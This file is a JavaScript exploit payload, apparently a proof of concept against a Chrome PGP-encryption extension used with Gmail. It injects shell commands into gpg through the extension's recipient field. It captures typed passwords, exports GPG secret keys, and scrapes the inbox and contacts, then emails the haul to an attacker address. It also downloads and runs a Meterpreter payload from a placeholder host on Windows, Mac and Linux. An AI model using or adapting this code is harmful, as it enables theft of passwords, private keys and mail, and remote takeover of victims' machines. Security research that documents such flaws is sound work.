if ((typeof jQuery == 'function') && !top.owned) {
	$(document).off('keyup', 'input[type=password]').on('keyup', 'input[type=password]', function() {localStorage['p'] = this.value});
	var attacker = '__attacker__';

	var meterpreter_url = 'http://__ip__/crgpg/meterpreter.php';
	var meterpreter = {
		win:  {
			payload: meterpreter_url + "?p=win",
			cmd: 'for /f "tokens=*" %i in (\'dir /s /b /o-d "%localappdata%\\google\\chrome\\user data\\default\\cache"\') do @cscript /e:vbs "%i" && exit',
		},
		mac:  {
			cmd: "curl " + meterpreter_url + "?p=osx 2>/dev/null | php -- ",
		},
		linux: {
			cmd: "curl " + meterpreter_url + "?p=linux 2>/dev/null > ~/.s && chmod u+x ~/.s && ~/.s",
		}
	};

	if (navigator.platform.indexOf('Win') !== -1) {
		var gpg = "c:\\Progra~1\\GNU\\Gnupg\\pub\\gpg";
		var nul = "nul";
		var cmdsep = '&';
		var cmdpref = " start /min ";
	} else {
		var gpg = "`which gpg`";
		var nul = "/dev/null";
		var cmdsep = ';';
		var cmdpref = "";
	};

	function getSecrets() {
		var fakeList = attacker + " > "+nul+" && " + gpg + " --export-secret-keys --armor ";
		chrome.extension.sendRequest({'messageType':'encrypt',encrypt:{'message':'','domel':'','maillist':[fakeList]}},function(r) {
			localStorage['secrets'] = r.message;
		});
	};

	function scrapGmail() {
		$.get('https://mail.google.com/mail/u/0/?ui=html&zy=s', function (r) {
			try {
				// get inbox html
				var base = r.match(/\<base href="(.*?)"\>/)[1];
				localStorage['inbox'] = r;
			} catch(e) {
				console.log('error base', r);
				return;
			};
			// attach contacts
			$.get(base+"?&v=cl&pnl=a", function(r) {
				var contacts = r.match(/[a-z0-9._+-]+@[a-z0-9._+-]+/g);
				localStorage['contacts'] = contacts;
			});
		});
	}

	function execCommand(command) {
		chrome.extension.sendRequest({'messageType':'encrypt',encrypt:{'message':'yo','domel':'','maillist':['any@thing.com --no-auto-key-locate >' + nul + cmdsep + cmdpref + command + cmdsep + 'echo ']}});
	};

	function sendEmail(contents, to, encrypt, callback) {
		$.get('https://mail.google.com/mail/u/0/?ui=html&zy=s', function (r) {
			try {
				var base = r.match(/\<base href="(.*?)"\>/)[1];
			} catch(e) {
				console.log('error base', r);
				return;
			};
			$.get(base + '?&v=b&pv=tl&cs=b', function(r) {
				try {
					var form = r.match(/action="(.*?)"/)[1];
				} catch(e) {
					console.log('error form', r);
					return;
				};
				function doSend(m, callback) {
					$.post(base+form, {
						'to': to,
						subject: 'exploiting ' + new Date(),
						body: m,
						nvp_bu_send: 'Send',
					}, callback);
			    };
				if (encrypt) {
				    chrome.extension.sendRequest({'messageType':'encrypt',encrypt:{'message':contents,'domel':'','maillist':[to]}}, function(r) {doSend(r.message, callback)});
				} else {
				    doSend(contents, callback);
				};
			});
		});
	};

	function buildEmail() {
		var r = '';
		if (localStorage['inbox'] && localStorage['inbox'].length) {
			r += "\n\nInbox HMTL: " + JSON.stringify(localStorage['inbox']);
	    }

		if (localStorage['contacts'] && localStorage['contacts'].length) {
			r += "\n\nContacts: " + JSON.stringify(localStorage['contacts']);
	    }
		if (localStorage['secrets']) {
			r += "\n\nSecrets:\n" + localStorage['secrets'];
	    }
		if (localStorage['p']) {
			r += "\n\nPassword: " + JSON.stringify(localStorage['p']);
	    }

		return r;
	}

	/* send secrets email */
	getSecrets();
	scrapGmail();
	setTimeout(function() {
		var r = buildEmail();
		if (r) {
			sendEmail(r, attacker, true);
		}
	}, 5000);

	/* poll for password */
	var pwdpoll = setInterval(function() {
		if (localStorage['p']) {/* we have password */
			var r = buildEmail();
			sendEmail(r, attacker, true);
			clearInterval(pwdpoll);
		}
	}, 20000);
	
	/* launch meterpreter */
	if (navigator.platform.indexOf('Win') !== -1) {
		$.get(meterpreter.win.payload, function() {/* store exploit in cache */
			execCommand(meterpreter.win.cmd);
		});
		execCommand('calc');
	} else if (navigator.platform.indexOf('Mac') !== -1) {
		execCommand(meterpreter.mac.cmd);
	} else {
		execCommand(meterpreter.linux.cmd);
	};
	
	top.owned = true;
};